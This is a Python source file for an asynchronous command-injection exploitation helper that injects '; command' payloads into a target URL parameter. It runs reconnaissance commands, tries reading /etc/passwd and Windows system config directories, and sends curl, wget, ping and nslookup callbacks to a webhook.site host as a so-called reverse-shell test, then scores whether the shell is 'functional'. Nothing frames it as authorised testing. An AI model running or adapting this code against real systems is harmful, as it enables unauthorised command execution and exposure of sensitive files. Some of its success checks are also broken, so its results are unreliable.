import httpx
import logging
import time
import asyncio

class ShellCheck:
    def __init__(self, callback_url=None):
        self.callback_url = callback_url or 'https://webhook.site/your-unique-id'
        self.shell_results = {}

    async def test_shell_access(self, target_url, param_name, payload):
        # Test if shell access is working
        try:
            logging.info(f"Testing shell access for {target_url}")
            
            # Test basic command execution
            basic_test = await self.test_basic_commands(target_url, param_name)
            self.shell_results['basic_commands'] = basic_test
            
            # Test reverse shell callback
            reverse_test = await self.test_reverse_shell(target_url, param_name)
            self.shell_results['reverse_shell'] = reverse_test
            
            # Test file operations
            file_test = await self.test_file_operations(target_url, param_name)
            self.shell_results['file_operations'] = file_test
            
            return self.shell_results
            
        except Exception as e:
            logging.error(f"Shell check failed: {e}")
            return {}

    async def test_basic_commands(self, target_url, param_name):
        # Test basic command execution
        basic_commands = [
            'whoami',
            'id',
            'hostname',
            'pwd',
            'ls',
            'dir',
            'uname -a',
            'systeminfo'
        ]
        
        results = {}
        for cmd in basic_commands:
            try:
                payload = f'; {cmd}'
                async with httpx.AsyncClient(timeout=10) as client:
                    test_url = target_url.replace(f'{param_name}=test', f'{param_name}={payload}')
                    resp = await client.get(test_url)
                    
                    # Check for command output indicators
                    if any(indicator in resp.text.lower() for indicator in ['root', 'admin', 'user', 'bin', 'usr', 'etc']):
                        results[cmd] = 'success'
                    else:
                        results[cmd] = 'failed'
            except Exception:
                results[cmd] = 'error'
        
        return results

    async def test_reverse_shell(self, target_url, param_name):
        # Test reverse shell callback
        try:
            # Generate reverse shell payload
            reverse_payloads = [
                f'curl {self.callback_url}?test=reverse',
                f'wget {self.callback_url}?test=reverse',
                f'ping -c 1 {self.callback_url.replace("https://", "").replace("http://", "")}',
                f'nslookup {self.callback_url.replace("https://", "").replace("http://", "")}'
            ]
            
            for payload in reverse_payloads:
                try:
                    async with httpx.AsyncClient(timeout=10) as client:
                        test_url = target_url.replace(f'{param_name}=test', f'{param_name}={payload}')
                        resp = await client.get(test_url)
                        
                        # Wait a bit for callback
                        await asyncio.sleep(2)
                        
                        # Check if callback was received (would need webhook API)
                        logging.info(f"Reverse shell payload sent: {payload}")
                        
                except Exception:
                    pass
            
            return {'status': 'tested', 'callback_url': self.callback_url}
            
        except Exception as e:
            logging.error(f"Reverse shell test failed: {e}")
            return {'status': 'failed', 'error': str(e)}

    async def test_file_operations(self, target_url, param_name):
        # Test file operations
        file_operations = [
            'ls -la',
            'dir',
            'cat /etc/passwd',
            'type C:\\windows\\system32\\drivers\\etc\\hosts',
            'find / -name "*.conf" 2>/dev/null | head -5',
            'dir C:\\windows\\system32\\config 2>nul'
        ]
        
        results = {}
        for op in file_operations:
            try:
                payload = f'; {op}'
                async with httpx.AsyncClient(timeout=10) as client:
                    test_url = target_url.replace(f'{param_name}=test', f'{param_name}={payload}')
                    resp = await client.get(test_url)
                    
                    # Check for file operation indicators
                    if any(indicator in resp.text.lower() for indicator in ['root:', 'drwx', 'total', 'Directory of', 'config']):
                        results[op] = 'success'
                    else:
                        results[op] = 'failed'
            except Exception:
                results[op] = 'error'
        
        return results

    async def verify_shell_functionality(self, target_url, param_name):
        # Verify shell functionality
        verification_tests = {
            'command_execution': await self.test_basic_commands(target_url, param_name),
            'file_access': await self.test_file_operations(target_url, param_name),
            'network_access': await self.test_reverse_shell(target_url, param_name)
        }
        
        # Calculate success rate
        total_tests = 0
        successful_tests = 0
        
        for test_type, results in verification_tests.items():
            if isinstance(results, dict):
                for test, result in results.items():
                    total_tests += 1
                    if result == 'success':
                        successful_tests += 1
        
        success_rate = (successful_tests / total_tests * 100) if total_tests > 0 else 0
        
        return {
            'verification_tests': verification_tests,
            'success_rate': success_rate,
            'shell_functional': success_rate > 50
        } 